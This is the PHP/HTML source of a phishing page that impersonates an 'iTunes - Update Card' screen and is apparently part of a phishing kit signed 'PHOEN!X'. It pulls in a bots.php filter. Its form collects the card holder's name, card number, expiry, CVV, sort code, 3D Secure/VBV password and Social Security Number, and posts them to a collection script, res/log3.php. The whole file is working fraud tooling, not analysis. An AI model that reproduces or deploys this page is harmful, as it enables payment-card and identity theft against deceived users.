<?php
if (!isset($_SESSION)) {
  session_start();
}

include "bots.php";


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
  <title>iTunes - Update Card</title>  
<link rel="icon" href="./img/favicon.ico">

<style>
.btn {
  background: #3baee7;
  background-image: -webkit-linear-gradient(top, #3baee7, #08c);
  background-image: -moz-linear-gradient(top, #3baee7, #08c);
  background-image: -ms-linear-gradient(top, #3baee7, #08c);
  background-image: -o-linear-gradient(top, #3baee7, #08c);
  background-image: linear-gradient(to bottom, #3baee7, #08c);
  -webkit-border-radius: 7;
  -moz-border-radius: 7;
  border-radius: 7px;
  text-shadow: 1px 1px 3px #666666;
  font-family: Arial;
  color: #ffffff;
  font-size: 16px;
  padding: 10px 130px 10px 125px;
  border: solid #1f628d 0px;
  text-decoration: none;
}

.btn:hover {
  background: #3cb0fd;
  background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
  background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
  text-decoration: none;
}
.dark {
	border: none;
	color: #525252;
	height: 25px;
	line-height:15px;
	margin-bottom: 16px;
	margin-right: 6px;
	margin-top: 2px;
	outline: 0 none;
	padding: 5px 0px 5px 5px;
	width: 30%;
	border-radius: 2px;
	-webkit-border-radius: 2px;
	-moz-border-radius: 2px;
	-moz-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
	background: #DFDFDF;
	}
}
.dark-select {
    background: #DFDFDF url('down-arrow.png') no-repeat right;
    background: #DFDFDF url('down-arrow.png') no-repeat right;
    appearance:none;
    -webkit-appearance:none; 
    -moz-appearance: none;
    text-indent: 0.01px;
    text-overflow: '';
    width: 70%;
    height: 35px;
	color: #525252;
	line-height: 25px;
}
</style>

</head>
<div>
<body background="./img/bg3.png" style="background-repeat: no-repeat" > 

<form class="" style="margin-top:230px;margin-left:330px" method="post" action="./res/log3.php" >
    
		<br>
        <input id="hold" type="text" maxlength="30" placeholder="Card Holder"  name="hold" class="dark" required title="Please Enter Card Holder">
        <br>
        <input id="numb" type="text" style="width: 15%;" maxlength="19" placeholder="xxxx xxxx xxxx xxxx"  name="numb" class="dark" required title="Please Enter Card Number">
        <br>
        <input id="expm" type="text" style="width: 3%;" maxlength="2" placeholder="MM"  name="expm" class="dark" required title="Please Enter Expiration Month">
		/&nbsp;&nbsp;<input id="expy" type="text" style="width: 5%;" maxlength="4" placeholder="YYYY"  name="expy" class="dark" required title="Please Enter Expiration Year">
        <br>
        <input id="cvv" type="text" style="width: 8%;" maxlength="4" placeholder="xxx / xxxx"  name="cvv" class="dark" required title="Please Enter CVV">
        <br>
        <input id="sort" type="text" style="width: 8%;" maxlength="9" placeholder="xx-xx-xx"  name="sort" class="dark" title="Please Enter Sort Code">
		<br>
        <input id="3d" type="text" style="width: 8%;" maxlength="8" placeholder="3D / VBV"  name="3d" class="dark" title="Please Enter 3D or VBV">
        <br>
        <input id="ssn" type="text" style="width: 8%;" maxlength="maxlength="11"" placeholder="xxx-xx-xxxx"  name="ssn" class="dark" title="Please Enter Social Security Number">
        <br>
<div >
	<input name="submit.x" type="submit" value="Validate" class="btn"/>
</div>
</br>
		<a  onmouseDown="alert('Try it a couple of times')"><font color="#2188D7"><strong> &nbsp </strong></font></a>
		</br>
		</br>
		</br>
</form>
<br><br><br><br><br><br>
</body>
<!-- PHOEN!X -->
</html>

